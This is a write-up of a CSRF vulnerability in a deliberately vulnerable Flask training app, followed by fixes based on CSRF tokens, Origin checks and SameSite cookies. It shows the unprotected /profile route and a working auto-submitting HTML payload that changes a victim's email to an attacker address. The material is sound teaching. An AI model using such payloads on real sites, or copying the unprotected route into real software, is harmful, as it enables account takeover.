# Cross-Site Request Forgery (CSRF) Vulnerability Writeup

---

## 🔍 Overview

Cross-Site Request Forgery (CSRF) occurs when an attacker tricks a victim’s browser into sending unintended requests to a web application in which the victim is authenticated. This can lead to unauthorized state-changing actions like changing emails, passwords, or even initiating money transfers — all without the user's consent.

---

## 💥 Location in VulnVault

* **Route:** `/profile`
* **Vulnerable Code Snippet:**

```python
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        if request.form.get('email'):
            return f"Email updated to: {request.form['email']}"
```

This form does not implement any CSRF token validation or referer/origin checks, making it vulnerable to CSRF attacks.

---

## 🧪 Proof of Concept

1. Host the following HTML code on a malicious site (e.g., `attacker.com`):

```html
<form action="http://localhost:5000/profile" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
```

2. If a logged-in user visits the malicious site, their browser will automatically submit the form to your vulnerable app — updating their email address without their consent.

---

## 🔓 Impact

* Unauthorized account changes (email, password, etc.)
* Possible privilege escalation
* Loss of data integrity
* Can be chained with other attacks for full account takeover

---

## 🛡️ Mitigation Strategies

* **Implement CSRF tokens** — Use random, per-session tokens embedded in every form and verified server-side.
* **Validate `Origin` or `Referer` headers** — Ensure requests originate from your own domain.
* **Use the `SameSite` cookie attribute** — Prevent cookies from being sent in cross-site requests.
* **Require re-authentication for sensitive actions** — Especially important for changes to critical account settings.

---

## ✅ Example Secure Implementation (Flask + Flask-WTF)

```python
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import Email
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

class ProfileForm(FlaskForm):
    email = StringField('Email', validators=[Email()])
    submit = SubmitField('Update')
```

In your template:

```html
<form method="POST">
  {{ form.hidden_tag() }}
  {{ form.email.label }} {{ form.email() }}
  {{ form.submit() }}
</form>
```

---

## 🔧 Tools for Testing

* [Burp Suite](https://portswigger.net/burp) (manual request crafting)
* [Postman](https://www.postman.com/)
* Custom HTML CSRF payloads

---

## 📚 References

* [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [PortSwigger: Cross-site request forgery](https://portswigger.net/web-security/csrf)
* [MDN Web Docs: SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

---

**CSRF is silent but dangerous — it abuses user trust in a site. Always use CSRF protection on state-changing actions.** 🔐🛡️
